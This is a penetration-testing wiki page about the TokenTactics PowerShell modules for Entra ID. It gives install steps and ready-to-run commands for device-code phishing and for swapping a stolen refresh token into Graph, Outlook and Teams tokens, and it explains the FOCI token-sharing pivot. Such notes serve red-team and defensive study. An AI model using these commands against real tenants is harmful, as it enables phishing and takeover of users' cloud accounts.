# TokenTactics

**Tags:** `#tokentactics` `#entraid` `#azuread` `#oauth` `#tokentheft` `#cloud` `#powershell`

PowerShell module (originally rvrsh3ll/0xBoku, actively maintained fork **TokenTacticsV2** by f-bader with CAE and v2 token endpoint support) for manipulating Entra ID OAuth tokens — requesting device-code tokens, refreshing an access token, and swapping a refresh token across resources/client IDs (the manual PowerShell equivalent of what [[Tools/Cloud/ROADtools|ROADtools]]'s `roadtx` does from Linux). Useful for turning one stolen refresh token into tokens for Graph, Exchange Online, SharePoint, or Azure ARM without re-authenticating.

**Source:** https://github.com/rvrsh3ll/TokenTactics (original) / https://github.com/f-bader/TokenTacticsV2 (maintained fork, recommended)
**Install:**
```powershell
git clone https://github.com/f-bader/TokenTacticsV2
Import-Module .\TokenTacticsV2\TokenTacticsV2.psd1
```

> [!warning] **Two forks, two vocabularies — match commands to the module you loaded (verified 2026-09-27).** The commands below are the **maintained f-bader/TokenTacticsV2** names (what the install above pulls). The **original rvrsh3ll/TokenTactics** instead uses `Get-AzureToken -Client MSGraph -Device`, `RefreshTo-<Resource>Token`, and `ConvertFrom-JWT` — don't mix the two sets.

```powershell
# Device code phishing — get an initial token  (V2: Get-EntraIDTokenFromDeviceCode)
Get-EntraIDTokenFromDeviceCode -Client MSGraph

# Swap a refresh token to another resource — generic form (-Client + -Domain), or a
# per-resource Invoke-RefreshTo<Resource>Token function:
Invoke-RefreshToToken -Client MSGraph -Domain <domain> -RefreshToken $response.refresh_token
Invoke-RefreshToOutlookToken -Domain <domain> -RefreshToken $response.refresh_token   # Exchange Online
Invoke-RefreshToMSTeamsToken -Domain <domain> -RefreshToken $response.refresh_token   # Teams

# Decode a JWT for inspection  (V2: ConvertFrom-JWTtoken)
ConvertFrom-JWTtoken -Token $response.access_token
```

> [!tip] **Why the swap works — FOCI.** The resource-to-resource pivot only works because
> the built-in Microsoft clients (Az CLI, Teams, Office, etc.) are a **Family of Client IDs**
> that *share* refresh tokens. A refresh token minted for one FOCI client can be redeemed for
> an access token scoped to any resource the family covers — so device-code-phish as one app,
> then `Invoke-RefreshTo…Token` your way into Graph / Outlook / SharePoint / ARM without ever
> re-prompting the user. Non-FOCI (custom) app tokens won't cross-swap.

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Token Theft & Abuse and FOCI Abuse sections — this tool automates the manual `curl` refresh-token exchanges shown there.
> Also used in [[Techniques/OAuth-OIDC-SAML|OAuth / OIDC / SAML Attacks]] (device code phishing, FOCI pivot, PRT escalation).

---

*Created: 2026-07-27*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
